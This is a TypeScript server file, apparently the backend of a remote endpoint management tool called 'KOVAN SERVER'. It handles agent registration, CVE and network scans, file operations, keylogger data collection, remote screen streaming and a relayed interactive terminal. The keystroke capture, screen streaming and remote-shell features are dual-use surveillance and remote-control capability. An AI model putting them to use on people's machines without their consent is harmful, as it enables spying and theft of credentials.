    await upsertAgent(agent);
  } catch (err) {
    console.error("[WS] Agent DB kayıt hatası:", err);
  }

  console.log(`[WS] Agent kayıtlandı: ${agentId} (${data.username}@${data.hostname}) [fp: ${data.fingerprint?.slice(0, 8)}...]`);
  ws.send(JSON.stringify({ type: "registered", agentId }));
  return agentId;
}

function handleResult(agentId: string, data: ResultData) {
  const status = data.error ? "error" : "completed";
  const output = data.error || data.output;
  store.updateCommand(data.commandId, status, output);
  console.log(`[WS] Komut sonucu: ${data.commandId} (${status})`);

  // Vuln scan komutu tamamlandıysa → CVE taraması başlat
  const vulnAgentId = pendingVulnScans.get(data.commandId);
  if (vulnAgentId) {
    pendingVulnScans.delete(data.commandId);
    if (data.error) {
      store.setVulnScan(vulnAgentId, {
        agentId: vulnAgentId,
        status: "error",
        startedAt: new Date().toISOString(),
        completedAt: new Date().toISOString(),
        scanned: 0,
        error: data.error,
        vulnerabilities: [],
        summary: { total: 0, critical: 0, high: 0, medium: 0, low: 0 },
      });
    } else {
      // Async CVE scan — dpkg çıktısını CVE DB ile karşılaştır
      console.log(`[VULN] Agent ${vulnAgentId} için CVE taraması başlatılıyor...`);
      performVulnScan(vulnAgentId, data.output).then((result) => {
        console.log(`[VULN] Agent ${vulnAgentId}: ${result.summary.total} zafiyet bulundu (${result.scanned} paket tarandı)`);
        // CVE alert check
        if (result.summary.critical > 0 || result.summary.high > 0) {
          const vulnAgent = store.getAgent(vulnAgentId);
          if (vulnAgent) {
            checkCveAlert(
              vulnAgentId,
              vulnAgent.alias || vulnAgent.hostname,
              result.summary.critical,
              result.summary.high,
              result.summary.total,
            ).catch((err) => console.error("[ALERT] CVE check hatası:", err));
          }
        }
      }).catch((err) => {
        console.error(`[VULN] Agent ${vulnAgentId} tarama hatası:`, err);
      });
    }
  }

  // Network scan komutu tamamlandıysa → ATTDAP'a gönder
  const netAgentId = pendingNetworkScans.get(data.commandId);
  if (netAgentId) {
    pendingNetworkScans.delete(data.commandId);
    if (data.error) {
      store.setNetworkScan(netAgentId, {
        agentId: netAgentId,
        status: "error",
        startedAt: new Date().toISOString(),
        completedAt: new Date().toISOString(),
        error: data.error,
        connections: [],
        summary: { total: 0, critical: 0, high: 0, medium: 0, low: 0, mean_score: 0, max_score: 0 },
      });
    } else {
      console.log(`[NETWORK] Agent ${netAgentId} için ağ anomali analizi başlatılıyor...`);
      performNetworkScan(netAgentId, data.output).then((result) => {
        console.log(`[NETWORK] Agent ${netAgentId}: ${result.connections.length} bağlantı analiz edildi (kritik: ${result.summary.critical}, yüksek: ${result.summary.high})`);
      }).catch((err) => {
        console.error(`[NETWORK] Agent ${netAgentId} analiz hatası:`, err);
      });
    }
  }
}

// ===== HTTP Server — Hono fetch adapter =====
const httpServer = createServer(async (req: IncomingMessage, res: ServerResponse) => {
  const url = `http://localhost:${PORT}${req.url || "/"}`;
  const headers = new Headers();
  for (const [key, val] of Object.entries(req.headers)) {
    if (val) headers.set(key, Array.isArray(val) ? val.join(", ") : val);
  }

  // Body okuma (POST vs.)
  let body: string | undefined;
  if (req.method !== "GET" && req.method !== "HEAD") {
    body = await new Promise<string>((resolve) => {
      let data = "";
      req.on("data", (chunk) => (data += chunk));
      req.on("end", () => resolve(data));
    });
  }

  const request = new Request(url, {
    method: req.method,
    headers,
    body: body || undefined,
  });

  const response = await app.fetch(request);

  res.writeHead(response.status, Object.fromEntries(response.headers.entries()));
  const resBody = await response.text();
  res.end(resBody);
});

// ===== WebSocket Server =====
const wss = new WebSocketServer({ noServer: true, perMessageDeflate: false });

wss.on("connection", (ws, req) => {
  let agentId: string | null = null;
  // Extract remote IP (strip ::ffff: prefix for IPv4-mapped addresses)
  let remoteIP = req.socket.remoteAddress || "";
  if (remoteIP.startsWith("::ffff:")) remoteIP = remoteIP.slice(7);
  // Check X-Forwarded-For for reverse proxy setups
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const first = (Array.isArray(forwarded) ? forwarded[0] : forwarded).split(",")[0].trim();
    if (first) remoteIP = first;
  }
  console.log(`[WS] Yeni bağlantı: ${remoteIP}`);

  ws.on("message", async (raw) => {
    try {
      const msg: WSMessage = JSON.parse(raw.toString());

      switch (msg.type) {
        case "register":
          agentId = await handleRegister(ws, msg.data, remoteIP);
          break;
        case "heartbeat": {
          const hbMsg = msg as any;
          if (hbMsg.agentId) {
            store.updateLastSeen(hbMsg.agentId);
            updateAgentStatus(hbMsg.agentId, true).catch(() => {});
            // Store metrics if included
            if (hbMsg.data?.metrics) {
              store.addMetrics(hbMsg.agentId, hbMsg.data.metrics);
              const count = store.getMetrics(hbMsg.agentId).length;
              console.log(`[METRICS] Agent ${hbMsg.agentId}: stored (total: ${count})`);
              // Check alert thresholds
              const agent = store.getAgent(hbMsg.agentId);
              if (agent) {
                checkMetricsAlerts(hbMsg.agentId, hbMsg.data.metrics, agent.alias || agent.hostname).catch((err) =>
                  console.error("[ALERT] Metrics check hatası:", err)
                );
              }
            } else {
              console.log(`[METRICS] Agent ${hbMsg.agentId}: heartbeat has no metrics data. Keys: ${JSON.stringify(Object.keys(hbMsg))}`);
            }
          }
          break;
        }
        case "result":
          if (msg.data) handleResult(msg.agentId, msg.data);
          break;

        // File manager result messages — resolve pending promises
        case "file_list_result":
        case "file_download_result":
        case "file_upload_result":
        case "file_delete_result":
        case "file_move_result":
        case "file_copy_result":
          if (msg.data?.requestId) {
            store.resolveFileRequest(msg.data.requestId, msg.data);
          }
          break;

        // Keylogger messages from agent
        case "keylog_started":
          if (msg.agentId) {
            store.setKeylogActive(msg.agentId, true);
            console.log(`[KEYLOG] Agent ${msg.agentId} keylogger başladı`);
          }
          break;
        case "keylog_stopped":
          if (msg.agentId) {
            store.setKeylogActive(msg.agentId, false);
            console.log(`[KEYLOG] Agent ${msg.agentId} keylogger durdu`);
          }
          break;
        case "keylog_data":
          if (msg.agentId && (msg as any).data?.events) {
            const events = (msg as any).data.events;
            store.addKeylogEvents(msg.agentId, events);
            console.log(`[KEYLOG] Agent ${msg.agentId}: ${events.length} tuş kaydedildi`);
          }
          break;
        case "keylog_error":
          if (msg.agentId) {
            const errMsg = (msg as any).data?.error || "Bilinmeyen hata";
            store.setKeylogError(msg.agentId, errMsg);
            console.error(`[KEYLOG] Agent ${msg.agentId} hata:`, errMsg);
          }
          break;

        // Screen streaming messages from agent
        case "screen_started":
          if (msg.agentId) {
            activeScreenSessions.add(msg.agentId);
            console.log(`[SCREEN] Agent ${msg.agentId} ekran akışı başladı (method: ${(msg as any).data?.method})`);
          }
          break;
        case "screen_stopped":
          if (msg.agentId) {
            activeScreenSessions.delete(msg.agentId);
            console.log(`[SCREEN] Agent ${msg.agentId} ekran akışı durdu`);
            const viewers = screenViewers.get(msg.agentId);
            if (viewers) {
              for (const v of viewers) {
                v.send(JSON.stringify({ type: "screen_stopped" }));
              }
              screenViewers.delete(msg.agentId);
            }
          }
          break;
        case "screen_frame":
          // Frame'i tüm viewer'lara ilet
          if (msg.agentId) {
            const viewers = screenViewers.get(msg.agentId);
            if (viewers) {
              const frameMsg = JSON.stringify(msg);
              for (const v of viewers) {
                if (v.readyState === WebSocket.OPEN) {
                  v.send(frameMsg);
                }
              }
            }
          }
          break;
        case "screen_error":
          if (msg.agentId) {
            activeScreenSessions.delete(msg.agentId);
            console.error(`[SCREEN] Agent ${msg.agentId} hata:`, (msg as any).data?.error);
            // Viewer'lara hatayı ilet
            const errViewers = screenViewers.get(msg.agentId);
            if (errViewers) {
              const errMsg = JSON.stringify(msg);
              for (const v of errViewers) {
                if (v.readyState === WebSocket.OPEN) v.send(errMsg);
              }
            }
          }
          break;

        // Interactive Terminal (PTY) messages from agent
        case "pty_started":
          if (msg.agentId) {
            activeTerminalSessions.add(msg.agentId);
            console.log(`[TERMINAL] Agent ${msg.agentId} terminal başladı (shell: ${(msg as any).data?.shell})`);
            // Relay to terminal viewers
            const ptyStartViewers = terminalViewers.get(msg.agentId);
            if (ptyStartViewers) {
              const fwd = JSON.stringify(msg);
              for (const v of ptyStartViewers) {
                if (v.readyState === WebSocket.OPEN) v.send(fwd);
              }
            }
          }
          break;
        case "pty_output":
          if (msg.agentId) {
            const ptyOutViewers = terminalViewers.get(msg.agentId);
            if (ptyOutViewers) {
              const fwd = JSON.stringify(msg);
              for (const v of ptyOutViewers) {
                if (v.readyState === WebSocket.OPEN) v.send(fwd);
              }
            }
          }
          break;
        case "pty_stopped":
          if (msg.agentId) {
            activeTerminalSessions.delete(msg.agentId);
            console.log(`[TERMINAL] Agent ${msg.agentId} terminal durdu`);
            const ptyStopViewers = terminalViewers.get(msg.agentId);
            if (ptyStopViewers) {
              const fwd = JSON.stringify(msg);
              for (const v of ptyStopViewers) {
                if (v.readyState === WebSocket.OPEN) v.send(fwd);
              }
            }
          }
          break;
        case "pty_exit":
          if (msg.agentId) {
            activeTerminalSessions.delete(msg.agentId);
            console.log(`[TERMINAL] Agent ${msg.agentId} shell çıkış yaptı:`, (msg as any).data?.reason);
            const ptyExitViewers = terminalViewers.get(msg.agentId);
            if (ptyExitViewers) {
              const fwd = JSON.stringify(msg);
              for (const v of ptyExitViewers) {
                if (v.readyState === WebSocket.OPEN) v.send(fwd);
              }
            }
          }
          break;
        case "pty_error":
          if (msg.agentId) {
            console.error(`[TERMINAL] Agent ${msg.agentId} hata:`, (msg as any).data?.error);
            const ptyErrViewers = terminalViewers.get(msg.agentId);
            if (ptyErrViewers) {
              const fwd = JSON.stringify(msg);
              for (const v of ptyErrViewers) {
                if (v.readyState === WebSocket.OPEN) v.send(fwd);
              }
            }
          }
          break;

        default:
          console.log(`[WS] Bilinmeyen mesaj tipi: ${(msg as any).type}`);
      }
    } catch (e) {
      console.error("[WS] Mesaj parse hatası:", e);
    }
  });

  ws.on("close", async () => {
    if (agentId) {
      console.log(`[WS] Agent bağlantısı kapandı: ${agentId}`);
      const offlineAgent = store.getAgent(agentId);
      store.setOffline(agentId);
      store.removeConn(agentId);
      // Offline alert
      if (offlineAgent) {
        checkOfflineAlert(agentId, offlineAgent.alias || offlineAgent.hostname).catch((err) =>
          console.error("[ALERT] Offline check hatası:", err)
        );
      }
      // Keylogger cleanup
      store.setKeylogActive(agentId, false);
      // Screen streaming cleanup
      activeScreenSessions.delete(agentId);
      const viewers = screenViewers.get(agentId);
      if (viewers) {
        for (const v of viewers) v.close();
        screenViewers.delete(agentId);
      }
      // Terminal cleanup
      activeTerminalSessions.delete(agentId);
      const termViewers = terminalViewers.get(agentId);
      if (termViewers) {
        for (const v of termViewers) {
          v.send(JSON.stringify({ type: "pty_exit", agentId, data: { reason: "Agent bağlantısı koptu" } }));
          v.close();
        }
        terminalViewers.delete(agentId);
      }
      try { await updateAgentStatus(agentId, false); } catch {}
    }
  });
});



// ===== Interactive Terminal (PTY) =====
const terminalViewers = new Map<string, Set<WebSocket>>();   // agentId -> terminal viewer WS'ler
const activeTerminalSessions = new Set<string>();

const terminalViewerWss = new WebSocketServer({ noServer: true, perMessageDeflate: false });

// Dashboard terminal viewer bağlanır — PTY I/O relay
terminalViewerWss.on("connection", (ws, req) => {
  const url = new URL(req.url || "/", `http://localhost:${PORT}`);
  const agentId = url.searchParams.get("agentId");

  if (!agentId) { ws.close(4000, "agentId gerekli"); return; }

  console.log(`[TERMINAL] Dashboard viewer bağlandı: ${agentId}`);

  // Viewer set
  if (!terminalViewers.has(agentId)) {
    terminalViewers.set(agentId, new Set());
  }
  terminalViewers.get(agentId)!.add(ws);

  // Viewer'dan gelen mesajları agent'a relay et
  ws.on("message", (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      const agentConn = store.getConn(agentId);
      if (!agentConn || agentConn.readyState !== WebSocket.OPEN) return;

      switch (msg.type) {
        case "pty_input":
          agentConn.send(JSON.stringify({ type: "pty_input", agentId, data: msg.data }));
          break;
        case "pty_resize":
          agentConn.send(JSON.stringify({ type: "pty_resize", agentId, data: msg.data }));
          break;
        case "pty_stop":
          agentConn.send(JSON.stringify({ type: "pty_stop", agentId }));
          break;
      }
    } catch (e) {
      console.error("[TERMINAL] Viewer mesaj parse hatası:", e);
    }
  });

  ws.on("close", () => {
    console.log(`[TERMINAL] Dashboard viewer ayrıldı: ${agentId}`);
    const viewers = terminalViewers.get(agentId);
    if (viewers) {
      viewers.delete(ws);
      if (viewers.size === 0) terminalViewers.delete(agentId);
    }
  });
});

// Terminal REST endpoints
app.post("/api/agents/:id/terminal/start", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const conn = store.getConn(agentId);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    return c.json({ success: false, error: "Agent bağlantısı yok" }, 500);
  }

  const body = await c.req.json<{ rows?: number; cols?: number }>().catch(() => ({}));

  conn.send(JSON.stringify({
    type: "pty_start",
    agentId,
    data: { rows: body.rows || 24, cols: body.cols || 80 },
  }));
  activeTerminalSessions.add(agentId);

  return c.json({ success: true, message: "Terminal başlatılıyor..." });
});

app.post("/api/agents/:id/terminal/stop", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const conn = store.getConn(agentId);
  if (conn && conn.readyState === WebSocket.OPEN) {
    conn.send(JSON.stringify({ type: "pty_stop", agentId }));
  }

  activeTerminalSessions.delete(agentId);
  const viewers = terminalViewers.get(agentId);
  if (viewers) {
    for (const v of viewers) {
      v.send(JSON.stringify({ type: "pty_stopped" }));
      v.close();
    }
    terminalViewers.delete(agentId);
  }

  return c.json({ success: true, message: "Terminal durduruldu" });
});

app.get("/api/agents/:id/terminal/status", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  return c.json({
    success: true,
    active: activeTerminalSessions.has(agentId),
    viewerCount: terminalViewers.get(agentId)?.size || 0,
  });
});

// ===== Screen Viewer WebSocket Endpoint =====
const screenViewerWss = new WebSocketServer({ noServer: true, perMessageDeflate: false });

// Dashboard screen viewer bağlanır — frame'ler JSON olarak iletilir
screenViewerWss.on("connection", (ws, req) => {
  const url = new URL(req.url || "/", `http://localhost:${PORT}`);
  const agentId = url.searchParams.get("agentId");

  if (!agentId) { ws.close(4000, "agentId gerekli"); return; }

  console.log(`[SCREEN-VIEWER] Dashboard viewer bağlandı: ${agentId}`);

  // Viewer set oluştur yoksa
  if (!screenViewers.has(agentId)) {
    screenViewers.set(agentId, new Set());
  }
  screenViewers.get(agentId)!.add(ws);

  ws.on("close", () => {
    console.log(`[SCREEN-VIEWER] Dashboard viewer ayrıldı: ${agentId}`);
    const viewers = screenViewers.get(agentId);
    if (viewers) {
      viewers.delete(ws);
      if (viewers.size === 0) screenViewers.delete(agentId);
    }
  });
});

// ===== Manuel WebSocket Upgrade =====
httpServer.on("upgrade", (req, socket, head) => {
  const { pathname } = new URL(req.url || "/", `http://localhost:${PORT}`);

  if (pathname === "/ws/agent") {
    wss.handleUpgrade(req, socket, head, (ws) => wss.emit("connection", ws, req));
  } else if (pathname === "/ws/screen") {
    screenViewerWss.handleUpgrade(req, socket, head, (ws) => screenViewerWss.emit("connection", ws, req));
  } else if (pathname === "/ws/terminal") {
    terminalViewerWss.handleUpgrade(req, socket, head, (ws) => terminalViewerWss.emit("connection", ws, req));
  } else {
    socket.destroy();
  }
});

// ===== DB'den agentları yükle ve başlat =====
(async () => {
  try {
    const dbAgents = await loadAgentsFromDB();
    for (const agent of dbAgents) {
      store.addAgent(agent);
    }
    console.log(`[DB] ${dbAgents.length} agent DB'den yüklendi`);
  } catch (err) {
    console.warn("[DB] Agent yükleme hatası (tablo olmayabilir):", (err as Error).message);
  }

  // Zamanlayıcıyı başlat
  startScheduler();

  httpServer.listen(PORT, () => {
    console.log(`
:: 🐝 KOVAN SERVER v1.0
:: HTTP API:  http://0.0.0.0:${PORT}
:: WebSocket: ws://0.0.0.0:${PORT}/ws/agent
:: Dashboard: http://localhost:${PORT}
`);
  });
})();

export { httpServer, wss };
